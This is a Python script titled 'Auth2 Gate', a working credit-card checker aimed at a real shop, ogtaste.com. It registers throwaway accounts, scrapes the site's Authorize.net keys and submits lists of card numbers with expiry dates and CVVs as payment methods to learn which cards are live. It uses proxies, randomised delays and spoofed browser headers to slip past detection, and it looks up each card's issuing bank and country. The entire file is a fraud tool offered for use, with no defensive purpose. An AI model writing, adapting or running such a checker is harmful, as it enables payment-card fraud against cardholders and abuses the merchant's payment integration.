# ============================================================
#  Auth2 Gate — Authorize.net via ogtaste.com
#  Auto-registers, tokenizes, and adds payment method
# ============================================================

import re
import time
import random
import string
import requests
import logging
import threading

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

SITE_URL = "https://ogtaste.com"
ACCOUNT_URL = f"{SITE_URL}/my-account/"
PAYMENT_URL = f"{SITE_URL}/my-account/payment-methods/"
ADD_PM_URL = f"{SITE_URL}/my-account/add-payment-method/"
AUTHNET_API = "https://api2.authorize.net/xml/v1/request.api"

HEADERS = {
    'authority': 'ogtaste.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://ogtaste.com',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

AUTHNET_HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json; charset=UTF-8',
    'Origin': 'https://ogtaste.com',
    'Referer': 'https://ogtaste.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

# BIN cache
_bin_cache = {}
_bin_cache_lock = threading.Lock()


def _generate_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"


def _get_bin_info(bin6):
    bin6 = bin6.replace(" ", "")[:6]
    with _bin_cache_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]

    apis = [
        (f"https://api.voidex.dev/api/bin?bin={bin6}", "voidex"),
        (f"https://binsapi.vercel.app/api/bin/{bin6}", "binsapi"),
        (f"https://bins.antipublic.cc/bins/{bin6}", "antipublic"),
        (f"https://lookup.binlist.net/{bin6}", "binlist"),
    ]

    for api_url, src in apis:
        try:
            headers = {"Accept": "application/json"}
            if src == "binlist":
                headers["Accept-Version"] = "3"
            r = requests.get(api_url, timeout=6, headers=headers)
            if r.status_code != 200:
                continue
            data = r.json()

            brand = (
                data.get('scheme') or data.get('brand') or
                data.get('Brand') or data.get('cardBrand') or 'N/A'
            )
            brand = brand.upper() if isinstance(brand, str) else 'N/A'

            bank_raw = data.get('bank')
            if isinstance(bank_raw, dict):
                bank = bank_raw.get('name', 'N/A')
            elif isinstance(bank_raw, str):
                bank = bank_raw
            else:
                bank = data.get('Bank') or data.get('issuer') or 'N/A'
            bank = bank.upper() if isinstance(bank, str) else 'N/A'

            country_raw = data.get('country')
            if isinstance(country_raw, dict):
                country = country_raw.get('name', 'N/A')
                emoji = country_raw.get('emoji', '')
            elif isinstance(country_raw, str):
                country = country_raw
                emoji = data.get('emoji', '')
            else:
                country = data.get('Country') or 'N/A'
                emoji = data.get('emoji', '')
            country = country.upper() if isinstance(country, str) else 'N/A'
            if not emoji:
                emoji = ''

            if brand != 'N/A' or bank != 'N/A':
                result = {"brand": brand, "bank": bank, "country": country, "emoji": emoji}
                with _bin_cache_lock:
                    _bin_cache[bin6] = result
                return result
        except Exception:
            continue

    fallback = {"brand": "N/A", "bank": "N/A", "country": "N/A", "emoji": ""}
    with _bin_cache_lock:
        _bin_cache[bin6] = fallback
    return fallback


def _classify_response(error_msg):
    """Classify the site response into Approved/Declined."""
    err = error_msg.lower()

    if any(x in err for x in ['success', 'approved', 'completed', 'added', 'verified', 'thank you', 'saved']):
        return "Approved", "Payment Method Added ✅"
    elif any(x in err for x in ['insufficient', 'limit', 'funds']):
        return "Approved", "Insufficient Funds ✅"
    elif any(x in err for x in ['incorrect', 'cvc', 'cvv', 'code']):
        return "Approved", "CVC Mismatch ✅"
    elif any(x in err for x in ['fraud', 'suspicious', 'blocked', 'risk', 'security', 'unauthorized']):
        return "Declined", "Fraud Block"
    elif any(x in err for x in ['declined', 'rejected', 'invalid', 'error', 'failed']):
        return "Declined", error_msg[:120]
    elif any(x in err for x in ['expired']):
        return "Declined", "Card Expired"
    elif any(x in err for x in ['address', 'avs', 'zip', 'postal']):
        return "Declined", "AVS Mismatch"
    elif any(x in err for x in ['3d', 'secure', 'authenticate', 'challenge']):
        return "Declined", "3DS Required"
    elif any(x in err for x in ['velocity', 'too many', 'rate']):
        return "Declined", "Rate Limited"
    elif any(x in err for x in ['pickup', 'stolen', 'lost', 'capture']):
        return "Declined", "Pickup Card"
    elif any(x in err for x in ['try again', 'later', 'temporary', 'timeout']):
        return "Declined", "Temporary Error"
    else:
        return "Declined", error_msg[:120]


def _process_card(cc, mm, yy, cvv, proxy_dict=None):
    """Auth2 check: register on ogtaste.com, tokenize via Authorize.net, add payment method."""
    try:
        s = requests.Session()

        if proxy_dict:
            s.proxies.update(proxy_dict)

        s.headers.update(HEADERS)

        time.sleep(random.uniform(0.3, 0.8))

        # Step 1: Load account page and get register nonce
        try:
            r_page = s.get(ACCOUNT_URL, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        if r_page.status_code == 429:
            return {"status": "ConnError", "response": "Rate limited (429)"}
        if r_page.status_code == 503:
            return {"status": "ConnError", "response": "Service unavailable (503)"}
        if r_page.status_code != 200:
            return {"status": "Error", "response": f"Site HTTP {r_page.status_code}"}

        reg_match = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', r_page.text)
        if not reg_match:
            return {"status": "Error", "response": "Register nonce not found"}
        reg_nonce = reg_match.group(1)

        # Step 2: Register a new account
        email = _generate_email()
        reg_data = {
            'email': email,
            'email_2': '',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': PAYMENT_URL,
            'wc_order_attribution_session_start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': HEADERS['user-agent'],
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/payment-methods/',
            'register': 'Register',
        }

        try:
            s.post(ACCOUNT_URL, params={'action': 'register'}, data=reg_data, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        # Step 3: Navigate to add-payment-method page
        try:
            s.get(PAYMENT_URL, timeout=15)
            r_apm = s.get(ADD_PM_URL, timeout=15)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        if r_apm.status_code != 200:
            return {"status": "Error", "response": f"Add PM page HTTP {r_apm.status_code}"}

        # Extract nonces and Authorize.net credentials
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce".*?value="(.*?)"', r_apm.text)
        login_id_match = re.search(r'"login_id":"(.*?)"', r_apm.text)
        client_key_match = re.search(r'"client_key":"(.*?)"', r_apm.text)

        if not nonce_match:
            return {"status": "Error", "response": "Payment nonce not found"}
        if not login_id_match or not client_key_match:
            return {"status": "Error", "response": "Authorize.net keys not found"}

        add_nonce = nonce_match.group(1)
        login_id = login_id_match.group(1)
        client_key = client_key_match.group(1)

        time.sleep(random.uniform(0.2, 0.5))

        # Step 4: Tokenize card via Authorize.net API (direct, no proxy)
        yy_short = yy[-2:] if len(yy) > 2 else yy
        authnet_json = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': login_id,
                    'clientKey': client_key,
                },
                'data': {
                    'type': 'TOKEN',
                    'id': '4dfd6f1b-e3f6-f732-3c8c-c704c17335bf',
                    'token': {
                        'cardNumber': cc,
                        'expirationDate': mm + yy_short,
                        'cardCode': cvv,
                    },
                },
            },
        }

        try:
            r_token = requests.post(AUTHNET_API, headers=AUTHNET_HEADERS, json=authnet_json, timeout=12)
        except Exception as e:
            return {"status": "ConnError", "response": f"Authnet API: {str(e)[:60]}"}

        try:
            data_value = re.search(r'"dataValue":"(.*?)"', r_token.text).group(1)
        except (AttributeError, TypeError):
            # Try to extract error
            err_match = re.search(r'"text":"(.*?)"', r_token.text)
            err_msg = err_match.group(1) if err_match else "Token creation failed"
            return {"status": "Declined", "response": err_msg[:120]}

        # Step 5: Submit payment method to site
        pm_data = {
            'payment_method': 'authnet',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            'authnet_nonce': data_value,
            'authnet_data_descriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
        }

        try:
            r_submit = s.post(ADD_PM_URL, data=pm_data, timeout=20)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ProxyError, ConnectionError, OSError) as e:
            return {"status": "ConnError", "response": str(e)[:80]}

        # Parse response
        try:
            error_msg = re.search(r'<li>\s*(.*?)\s*</li>', r_submit.text).group(1).strip()
        except (AttributeError, TypeError):
            # Check if payment methods page shows success
            if 'payment-methods' in r_submit.url or 'payment method' in r_submit.text.lower():
                return {"status": "Approved", "response": "Payment Method Added ✅"}
            error_msg = "Unknown response"

        status, response = _classify_response(error_msg)
        return {"status": status, "response": response}

    except Exception as e:
        err_str = str(e)[:80]
        conn_keywords = ["Max retries", "ConnectionPool", "ConnectionError",
                         "Timeout", "Connection refused", "Connection reset",
                         "SSLError", "RemoteDisconnected"]
        if any(k in err_str for k in conn_keywords):
            return {"status": "ConnError", "response": err_str}
        return {"status": "Error", "response": err_str}


def check_card(cc_line, proxy_dict=None):
    """Public entry point. cc_line: CC|MM|YY|CVV"""
    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")

    if status == "ConnError":
        return f"ConnError | {response}"

    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Authorize.net Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Authorize.net Auth\n"
            f"BIN: {bin_info['brand']} - {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site():
    """Health check for auth2 gate."""
    try:
        r = requests.get(
            ACCOUNT_URL,
            headers={"User-Agent": HEADERS['user-agent']},
            timeout=10, allow_redirects=True,
        )
        alive = r.status_code == 200 and 'register' in r.text.lower()
        return alive, f"HTTP {r.status_code}" + (" | Registration available" if alive else " | No registration form")
    except Exception as e:
        return False, str(e)[:60]
